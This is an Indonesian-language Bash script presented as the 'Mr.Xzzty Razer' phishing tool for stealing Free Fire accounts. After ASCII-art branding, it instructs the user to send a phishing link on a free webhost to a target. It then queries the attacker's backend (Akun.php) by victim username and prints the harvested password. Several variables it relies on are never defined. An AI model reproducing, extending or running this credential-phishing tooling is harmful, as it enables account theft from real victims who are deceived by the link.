#!/bin/bash
intro(){
echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
read nick #membaca yang ditulis
echo "            _,.-------.,_ "
sleep 0.03
echo "        ,;~'             '~;, "
sleep 0.03
echo "      ,;                     ;, "
sleep 0.03
echo "     ;                         ; "
sleep 0.03
echo "    ,'                         ', "
sleep 0.03
echo "   ,;                           ;, "
sleep 0.03
echo "   ; ;      .           .      ; ; "
sleep 0.03
echo "   | ;   ______       ______   ; | "
sleep 0.03
echo "   |  '/~'     ~' . '~     '~\'  | "
sleep 0.03
echo "   |  ~  ,-~~~^~, | ,~^~~~-,  ~  | "
sleep 0.03
echo "    |   |        }:{        |   | "
sleep 0.03
echo "    |   l       / | \       !   | "
sleep 0.03
echo "    .~  (__,.--' .^. '--.,__)  ~. "
sleep 0.03
echo "    |     ---;' / | \ ';---     | "
sleep 0.03
echo "     \__.       \/^\/       .__/ "
sleep 0.03
echo "      V| \                 / |V "
sleep 0.03
echo "       | |T~\___!___!___/~T| | "
sleep 0.03
echo "       | |'IIII_I_I_I_IIII'| | "
sleep 0.03
echo "       |  \,III I I I III,/  | "
sleep 0.03
echo "        \   '~~~~~~~~~~'    / "
sleep 0.03
echo "          \   .       .   / "
sleep 0.03
echo "            \.    ^    ./ " 
sleep 0.03
echo "              ^~~~^~~~^  "
sleep 0.03
echo "  ================================"
sleep 2
echo "  ==       Mr.Xzzty Razer     =="
sleep 0.7
echo "  ================================" | 
echo " Mr.Xzzty Project adalah Tools phising "
echo " Hack Free Fire "
echo
echo "Selamat datang "$nick
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    
}

clear
echo Mohon tunggu..
load
clear
intro
response=`curl -H "$MrXzzty" -m "240" -s -o /dev/null -w "%{http_code}" $cek`
#echo $response
if [[ $response != *200* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo
    echo "Cara penggunaan :"
    echo "1. Copy link ini :https://event-ff9.000webhostapp.com/"
    echo "2. Kirim link yang sudah di copy ke target"
    echo "3. Jika korban sudah terkena bisa langsung di cek"
    echo 
    echo "Mau melakukan cek target?"
    echo "y/n?"
    read confirm
    if [ $confirm = "y" ]; then
            echo "Silahkan masukan username target"
            echo "contoh Ahmad_"
            read target # masukin user instagram
            echo
            echo "Apakah username $target sudah benar?"
            echo y/n?
            read confirm
        echo
        if [ $confirm = "y" ]; then
                echo Melakukan pencarian password username : $target
                load
            echo
            echo
                    echo "Jangan close aplikasi sebelum scan selesai"            
                    echo "========================================"
                cek_target=`curl -s $get_url/Akun.php?cari=$target`
                echo -e $cek_target
            echo "======================================="
                    echo " Gunakan tools dengan bijak"
                    echo " Mr.Xzzty"
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi            
    else
                echo "Terimakasih sudah menggunakan MrXzzty Razer"
    fi
fi